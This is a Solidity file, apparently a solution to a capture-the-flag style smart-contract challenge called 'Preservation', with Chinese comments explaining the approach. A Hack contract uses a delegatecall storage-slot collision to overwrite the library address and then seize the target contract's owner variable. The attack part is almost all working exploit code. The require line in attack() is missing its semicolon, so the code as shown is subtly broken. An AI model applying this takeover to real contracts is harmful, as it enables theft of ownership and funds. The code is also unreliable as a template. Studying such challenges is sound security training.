// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
    //大体思路是，先调用这个attack的函数，从而修改了timeZone1Library的地址，从而在第二次调用的时候利用这个合约的恶意setTime函数
    function attack(Preservation target) external{
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(address(msg.sender))));//为了使得最后它的所有者是用户，所以这个地方为msg.sender
        require(target.owner()==msg.sender,"hack failed")
        }
        //这一部分使得timeZone1Library转换为Hack的地址
        //这个uint256是使得最后能够与被输入的匹配，为了便于理解才有以下的操作
        //而这个uint160是因为在 Solidity 中，地址类型是一个特殊的固定大小的类型，它是 20 字节（160 位）长的字节数组。因此，你可以将地址类型转换为 uint160
        function setTime(uint _owner)external {
            owner=address(uint160(_owner));
        }
    
}
contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
  //这一行的意思为，让前面那个等于后面这个函数签名

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    //这个地方使用的encodePacked意思为打包这两个并且为二进制编码，输入——timestamp的形式
    //由于这个地方为delegatecall所以可以利用这个来进行攻击
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));

  }
}

// Simple library contract to set the time
contract LibraryContract {
//由于是delegatecall所以这个地方存储的东西将放在原合约当中，按照原来的顺序
  uint storedTime;  
//由于原合约当中不包含storedTime，且第一个变量是timeZone1Library所以输入的值将会存在这个地方
  function setTime(uint _time) public {
    storedTime = _time;
  }
}